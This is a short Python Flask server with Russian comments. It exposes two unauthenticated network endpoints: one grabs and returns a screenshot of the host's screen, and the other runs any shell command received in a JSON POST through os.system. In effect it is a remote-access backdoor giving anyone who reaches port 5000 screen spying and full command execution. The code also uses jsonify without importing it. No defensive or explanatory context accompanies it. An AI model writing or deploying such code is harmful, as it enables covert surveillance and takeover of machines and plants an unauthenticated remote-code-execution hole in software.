from flask import Flask, request, send_file
import subprocess
import os
from PIL import ImageGrab
import io
app = Flask(__name__)
@app.route('/screenshot', methods=['GET'])
def take_screenshot():
    # Создаем скриншот
    screenshot = ImageGrab.grab()
    
    # Сохраняем скриншот в памяти
    img_io = io.BytesIO()
    screenshot.save(img_io, 'PNG')
    img_io.seek(0)

    # Отправляем файл скриншота на сервер без сохранения на диск
    return send_file(img_io, mimetype='image/png')
    
@app.route('/execute_command', methods=['POST'])
def execute_command():
    data = request.get_json()
    command = data.get('command', '')

    if command:
        os.system(command)
        return jsonify({"message": f"Command '{command}' executed"}), 200
    else:
        return jsonify({"message": "No command provided"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
